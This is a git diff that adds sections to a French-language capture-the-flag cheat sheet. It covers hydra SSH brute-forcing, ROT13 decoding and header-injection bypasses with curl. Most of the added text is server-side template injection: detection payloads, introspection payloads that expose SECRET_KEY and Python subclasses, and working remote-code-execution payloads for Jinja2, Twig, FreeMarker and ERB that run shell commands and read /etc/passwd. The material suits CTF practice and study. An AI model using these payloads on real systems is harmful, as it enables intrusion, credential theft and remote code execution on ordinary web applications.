@@ -66,3 +66,80 @@
 | `echo -e "p1\np2" > [file]` | **Création de liste**. Crée un fichier avec un mot de passe par ligne. | `echo -e "123\nmotdepasse" > pass.txt` |
 | `hydra -l [user] -P [file] ssh://[IP]` | **Attaque SSH**. Tente de forcer l'accès avec une liste de mots de passe. | `hydra -l kali -P pass.txt ssh://127.0.0.1` |
 
+
+## Web : Headers & Décodage (Bypass)
+
+| Commande | Description | Exemple |
+| :--- | :--- | :--- |
+| `echo "[texte]" \| tr 'A-Za-z' 'N-ZA-Mn-za-m'` | **Décodeur ROT13**. Pour les indices cachés (ex: `Wnpx` -> `Jack`). | `echo "K-Qri-Npprff" \| tr...` |
+| `curl -H "[Header]: [Value]" [URL]` | **Bypass Header (Terminal)**. Injecte un en-tête pour forcer l'accès. | `curl -H "X-Dev-Access: yes" [URL]` |
+| **F12 > Network > Edit & Resend** | **Bypass Header (Firefox)**. Ajouter manuellement le header décodé. | Ajouter `X-Dev-Access: yes` |
+
+> **Règle d'or :** Si le serveur répond **200 OK** mais que rien ne change sur la page, le flag est dans l'onglet **Response** de l'inspecteur réseau.
+
+---
+## SSTI : Identification & Exploitation (Multi-Langages)
+
+Le succès d'une injection dépend du langage utilisé par le serveur. Toujours suivre l'ordre : **Détection** > **Identification** > **Exploitation**.
+
+### 1. Identification du Moteur (Détection)
+
+| Payload | Jinja2 (Python) | Twig (PHP) | Mako (Python) |
+| :--- | :--- | :--- | :--- |
+| `{{ 7*7 }}` | **49** | **49** | `{{ 7*7 }}` |
+| `{{ 7*'7' }}` | **7777777** | Erreur / 49 | `{{ 7*'7' }}` |
+| `${7*7}` | `${7*7}` | `${7*7}` | **49** |
+
+**Syntaxes Spécifiques :**
+* **Ruby (ERB)** : `<%= 7*7 %>`
+* **Java (FreeMarker)** : `${7*7}`
+* **JavaScript (Pug)** : `#{7*7}`
+* **ASP.NET (Razor)** : `@(7*7)`
+
+> **Règle d'or :** Si `{{ 7*7 }}` affiche `49`, testez `{{ 7*'7' }}`. Si ça affiche `7777777`, vous êtes sûr à 100% d'être sur du **Python/Jinja2**.
+
+---
+
+### 2. Reconnaissance Avancée (Objets Internes)
+*Une fois le moteur identifié, on cherche à voir ce qui est accessible avant de tenter le RCE.*
+
+| Langage | Payload d'Introspection | Ce qu'on cherche |
+| :--- | :--- | :--- |
+| **Python (Jinja2)** | `{{ config.items() }}` | `SECRET_KEY`, Database URIs. |
+| **Python (Jinja2)** | `{{ [].__class__.__base__.__subclasses__() }}` | L'index de `os._wrap_close` ou `subprocess.Popen`. |
+| **PHP (Twig)** | `{{ _self }}` | L'objet template actuel. |
+| **PHP (Twig)** | `{{ _context }}` | Les variables disponibles (username, flag path...). |
+| **Java** | `${.data_model}` | Les objets exposés par l'application. |
+
+---
+
+### 3. Exploitation (RCE - Remote Code Execution)
+*L'objectif est d'exécuter `ls` (lister) puis `cat` (lire).*
+
+#### A. Python (Jinja2 / Flask)
+| Objectif | Payload |
+| :--- | :--- |
+| **Tester la RCE (ls)** | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}` |
+| **Lire le Flag (cat)** | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}` |
+| **Via Index précis** | `{{ [].__class__.__base__.__subclasses__()[INDEX].__init__.__globals__['os'].popen('ls').read() }}` |
+
+> **Note Debug :** Si l'index renvoie **Error 500**, utilisez le payload **Universel** (le premier).
+
+#### B. PHP (Twig)
+| Objectif | Payload |
+| :--- | :--- |
+| **RCE (ls)** | `{{['ls']\|filter('system')}}` |
+| **RCE (cat)** | `{{['cat flag.txt']\|filter('system')}}` |
+| **Lecture Fichier** | `{{'/etc/passwd'\|file_excerpt(1,30)}}` (Si `system` est bloqué) |
+
+#### C. Java (FreeMarker)
+| Objectif | Payload |
+| :--- | :--- |
+| **RCE (ls)** | `${new freemarker.template.utility.Execute().exec("ls")}` |
+| **RCE (cat)** | `${new freemarker.template.utility.Execute().exec("cat flag.txt")}` |
+
+#### D. Ruby (ERB)
+| Objectif | Payload |
+| :--- | :--- |
+| **RCE (ls)** | `<%= %x(ls) %>` |
+| **RCE (cat)** | `<%= %x(cat flag.txt) %>` |
